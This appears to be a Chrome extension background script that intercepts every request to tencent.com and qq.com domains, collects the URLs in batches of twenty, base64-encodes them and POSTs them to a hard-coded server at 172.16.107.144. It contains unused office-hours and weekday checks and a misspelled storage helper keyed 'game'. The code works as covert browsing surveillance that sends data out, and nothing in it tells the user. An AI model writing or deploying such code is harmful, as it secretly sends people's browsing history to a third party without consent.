'use strict';
var url_array = [];
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        var length = url_array.push(details.url);
        if (length > 19){
            sendlog(url_array);
            url_array = [];
        }
        return details.url;
    },
    {
        urls: [
            "*://*.tencent.com/*",
            "*://*.qq.com/*"
        ],
        types: ["main_frame", "sub_frame", "object", "xmlhttprequest", "other"]
    },
    ["blocking"]
);

function isOfficeTime(currentTime){
    var hour = currentTime.getHours();
    return hour >= 9 && hour < 23;
}

function isWeekday(currentTime){
    var dayOfWeek = currentTime.getDay();
    return dayOfWeek >= 1 && dayOfWeek <= 5;
}

function sendlog(urls) {
    var text = '';
    urls.forEach(function(url) {
        text += url;
        text += '\n';
    }, '');
    text = btoa(text);
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.open("POST","http://172.16.107.144/accept.php",true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send("data=" + text);
}

function sotre_urls(urls){
    var dbName = 'game';
    var storage = {};
    var status = 0;
    storage[dbName] = { 'urls': [] };
    storage[dbName].urls = urls;
    alert(storage[dbName].urls);
    chrome.storage.local.set( storage, function() {
  // optional callback
    });

}
